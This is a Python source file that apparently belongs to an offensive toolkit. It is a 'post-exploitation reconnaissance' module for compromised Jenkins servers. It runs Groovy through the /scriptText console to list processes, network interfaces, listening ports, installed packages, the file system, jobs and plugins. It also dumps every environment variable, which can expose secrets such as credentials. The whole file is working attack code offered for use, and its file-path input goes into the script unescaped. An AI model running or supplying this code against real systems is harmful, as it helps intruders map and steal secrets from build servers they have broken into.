"""Post-exploitation reconnaissance module.

Performs system enumeration including running processes, network configuration,
installed software, and file system reconnaissance via Groovy script execution.
"""

from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class SystemInfo:
    """System information collected during reconnaissance."""
    hostname: Optional[str] = None
    os_name: Optional[str] = None
    os_version: Optional[str] = None
    os_arch: Optional[str] = None
    java_version: Optional[str] = None
    jenkins_version: Optional[str] = None
    user: Optional[str] = None
    home_dir: Optional[str] = None
    working_dir: Optional[str] = None


@dataclass
class NetworkInfo:
    """Network configuration information."""
    interfaces: list[dict[str, Any]]
    listening_ports: list[int]
    connections: list[dict[str, Any]]
    routing_table: list[str]


@dataclass
class ProcessInfo:
    """Running process information."""
    pid: int
    name: str
    command: str
    user: Optional[str] = None


class ReconnaissanceModule:
    """Performs post-exploitation reconnaissance on compromised Jenkins."""

    def __init__(self, session: Any):
        """Initialize reconnaissance module.

        Args:
            session: Authenticated Jenkins session
        """
        self.session = session

    def _execute_groovy(self, script: str) -> Optional[str]:
        """Execute Groovy script on Jenkins.

        Args:
            script: Groovy script to execute

        Returns:
            Script output or None on failure
        """
        try:
            response = self.session.post(
                f"{self.session.target}/scriptText",
                data={"script": script}
            )

            if response.status_code == 200:
                return response.text
            return None
        except Exception:
            return None

    def enumerate_system_info(self) -> SystemInfo:
        """Enumerate basic system information.

        Returns:
            SystemInfo object with collected data
        """
        script = """
println "HOSTNAME:" + InetAddress.getLocalHost().getHostName()
println "OS_NAME:" + System.getProperty("os.name")
println "OS_VERSION:" + System.getProperty("os.version")
println "OS_ARCH:" + System.getProperty("os.arch")
println "JAVA_VERSION:" + System.getProperty("java.version")
println "JENKINS_VERSION:" + Jenkins.instance.getVersion()
println "USER:" + System.getProperty("user.name")
println "HOME_DIR:" + System.getProperty("user.home")
println "WORKING_DIR:" + System.getProperty("user.dir")
"""

        output = self._execute_groovy(script)
        if not output:
            return SystemInfo()

        info = SystemInfo()
        for line in output.split('\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                key = key.strip().lower()
                value = value.strip()

                if key == "hostname":
                    info.hostname = value
                elif key == "os_name":
                    info.os_name = value
                elif key == "os_version":
                    info.os_version = value
                elif key == "os_arch":
                    info.os_arch = value
                elif key == "java_version":
                    info.java_version = value
                elif key == "jenkins_version":
                    info.jenkins_version = value
                elif key == "user":
                    info.user = value
                elif key == "home_dir":
                    info.home_dir = value
                elif key == "working_dir":
                    info.working_dir = value

        return info

    def enumerate_running_processes(self) -> list[ProcessInfo]:
        """Enumerate running processes.

        Returns:
            List of ProcessInfo objects
        """
        script = """
def processes = []
try {
    def proc = "ps aux".execute()
    proc.waitFor()
    def output = proc.in.text
    output.eachLine { line ->
        if (!line.startsWith("USER")) {
            println line
        }
    }
} catch (Exception e) {
    try {
        def proc = "tasklist".execute()
        proc.waitFor()
        println proc.in.text
    } catch (Exception e2) {
        println "ERROR: " + e2.message
    }
}
"""

        output = self._execute_groovy(script)
        if not output:
            return []

        processes = []
        for line in output.split('\n'):
            if line.strip() and not line.startswith('ERROR'):
                parts = line.split()
                if len(parts) >= 2:
                    try:
                        pid = int(parts[1]) if parts[1].isdigit() else 0
                        processes.append(ProcessInfo(
                            pid=pid,
                            name=parts[0] if parts else "unknown",
                            command=' '.join(parts[10:]) if len(parts) > 10 else ' '.join(parts),
                            user=parts[0] if parts else None
                        ))
                    except (ValueError, IndexError):
                        pass

        return processes

    def enumerate_network_interfaces(self) -> list[dict[str, Any]]:
        """Enumerate network interfaces.

        Returns:
            List of network interface information
        """
        script = """
import java.net.NetworkInterface
import java.net.InetAddress

NetworkInterface.getNetworkInterfaces().each { iface ->
    println "INTERFACE:" + iface.getName()
    println "DISPLAY_NAME:" + iface.getDisplayName()
    println "UP:" + iface.isUp()
    println "LOOPBACK:" + iface.isLoopback()
    iface.getInetAddresses().each { addr ->
        println "ADDRESS:" + addr.getHostAddress()
    }
    println "---"
}
"""

        output = self._execute_groovy(script)
        if not output:
            return []

        interfaces = []
        current_iface = {}
        addresses = []

        for line in output.split('\n'):
            line = line.strip()
            if line == "---":
                if current_iface:
                    current_iface["addresses"] = addresses
                    interfaces.append(current_iface)
                    current_iface = {}
                    addresses = []
            elif ':' in line:
                key, value = line.split(':', 1)
                key = key.strip().lower()
                value = value.strip()

                if key == "interface":
                    current_iface["name"] = value
                elif key == "display_name":
                    current_iface["display_name"] = value
                elif key == "up":
                    current_iface["up"] = value.lower() == "true"
                elif key == "loopback":
                    current_iface["loopback"] = value.lower() == "true"
                elif key == "address":
                    addresses.append(value)

        return interfaces

    def enumerate_listening_ports(self) -> list[int]:
        """Enumerate listening ports.

        Returns:
            List of listening port numbers
        """
        script = """
try {
    def proc = "netstat -tuln".execute()
    proc.waitFor()
    println proc.in.text
} catch (Exception e) {
    try {
        def proc = "netstat -an".execute()
        proc.waitFor()
        println proc.in.text
    } catch (Exception e2) {
        println "ERROR: " + e2.message
    }
}
"""

        output = self._execute_groovy(script)
        if not output:
            return []

        ports = set()
        for line in output.split('\n'):
            if 'LISTEN' in line or 'LISTENING' in line:
                parts = line.split()
                for part in parts:
                    if ':' in part:
                        try:
                            port = int(part.split(':')[-1])
                            ports.add(port)
                        except (ValueError, IndexError):
                            pass

        return sorted(ports)

    def enumerate_installed_software(self) -> list[str]:
        """Enumerate installed software.

        Returns:
            List of installed software packages
        """
        script = """
def software = []
try {
    def commands = [
        "dpkg -l",
        "rpm -qa",
        "pip list",
        "pip3 list",
        "gem list",
        "npm list -g --depth=0"
    ]

    commands.each { cmd ->
        try {
            def proc = cmd.execute()
            proc.waitFor()
            if (proc.exitValue() == 0) {
                println "CMD:" + cmd
                println proc.in.text
                println "---"
            }
        } catch (Exception e) {
        }
    }
} catch (Exception e) {
    println "ERROR: " + e.message
}
"""

        output = self._execute_groovy(script)
        if not output:
            return []

        software = []
        current_cmd = None

        for line in output.split('\n'):
            line = line.strip()
            if line.startswith('CMD:'):
                current_cmd = line.replace('CMD:', '').strip()
            elif line == "---":
                current_cmd = None
            elif current_cmd and line and not line.startswith('ERROR'):
                software.append(f"{current_cmd}: {line}")

        return software

    def enumerate_environment_variables(self) -> dict[str, str]:
        """Enumerate environment variables.

        Returns:
            Dictionary of environment variables
        """
        script = """
System.getenv().each { key, value ->
    println key + "=" + value
}
"""

        output = self._execute_groovy(script)
        if not output:
            return {}

        env_vars = {}
        for line in output.split('\n'):
            if '=' in line:
                key, value = line.split('=', 1)
                env_vars[key.strip()] = value.strip()

        return env_vars

    def enumerate_file_system(self, path: str = "/") -> list[str]:
        """Enumerate file system at given path.

        Args:
            path: Path to enumerate

        Returns:
            List of file paths
        """
        script = f"""
import java.io.File

def listFiles(path, maxDepth, currentDepth = 0) {{
    if (currentDepth >= maxDepth) return

    try {{
        new File(path).listFiles()?.each {{ file ->
            println file.getAbsolutePath()
            if (file.isDirectory() && currentDepth < maxDepth - 1) {{
                listFiles(file.getAbsolutePath(), maxDepth, currentDepth + 1)
            }}
        }}
    }} catch (Exception e) {{
    }}
}}

listFiles("{path}", 3)
"""

        output = self._execute_groovy(script)
        if not output:
            return []

        return [line.strip() for line in output.split('\n') if line.strip()]

    def enumerate_jenkins_jobs(self) -> list[dict[str, Any]]:
        """Enumerate Jenkins jobs and their configurations.

        Returns:
            List of job information dictionaries
        """
        script = """
Jenkins.instance.getAllItems(Job.class).each { job ->
    println "JOB:" + job.getFullName()
    println "URL:" + job.getUrl()
    println "BUILDABLE:" + job.isBuildable()
    println "---"
}
"""

        output = self._execute_groovy(script)
        if not output:
            return []

        jobs = []
        current_job = {}

        for line in output.split('\n'):
            line = line.strip()
            if line == "---":
                if current_job:
                    jobs.append(current_job)
                    current_job = {}
            elif ':' in line:
                key, value = line.split(':', 1)
                key = key.strip().lower()
                value = value.strip()
                current_job[key] = value

        return jobs

    def enumerate_jenkins_plugins(self) -> list[dict[str, str]]:
        """Enumerate installed Jenkins plugins.

        Returns:
            List of plugin information dictionaries
        """
        script = """
Jenkins.instance.pluginManager.plugins.each { plugin ->
    println "PLUGIN:" + plugin.getShortName()
    println "VERSION:" + plugin.getVersion()
    println "ACTIVE:" + plugin.isActive()
    println "---"
}
"""

        output = self._execute_groovy(script)
        if not output:
            return []

        plugins = []
        current_plugin = {}

        for line in output.split('\n'):
            line = line.strip()
            if line == "---":
                if current_plugin:
                    plugins.append(current_plugin)
                    current_plugin = {}
            elif ':' in line:
                key, value = line.split(':', 1)
                key = key.strip().lower()
                value = value.strip()
                current_plugin[key] = value

        return plugins

    def perform_full_reconnaissance(self) -> dict[str, Any]:
        """Perform comprehensive reconnaissance.

        Returns:
            Dictionary containing all reconnaissance results
        """
        return {
            "system_info": self.enumerate_system_info(),
            "processes": self.enumerate_running_processes(),
            "network_interfaces": self.enumerate_network_interfaces(),
            "listening_ports": self.enumerate_listening_ports(),
            "installed_software": self.enumerate_installed_software(),
            "environment_variables": self.enumerate_environment_variables(),
            "jenkins_jobs": self.enumerate_jenkins_jobs(),
            "jenkins_plugins": self.enumerate_jenkins_plugins(),
        }


def perform_reconnaissance(session: Any) -> dict[str, Any]:
    """Factory function to perform full reconnaissance.

    Args:
        session: Authenticated Jenkins session

    Returns:
        Dictionary of reconnaissance results
    """
    recon = ReconnaissanceModule(session)
    return recon.perform_full_reconnaissance()
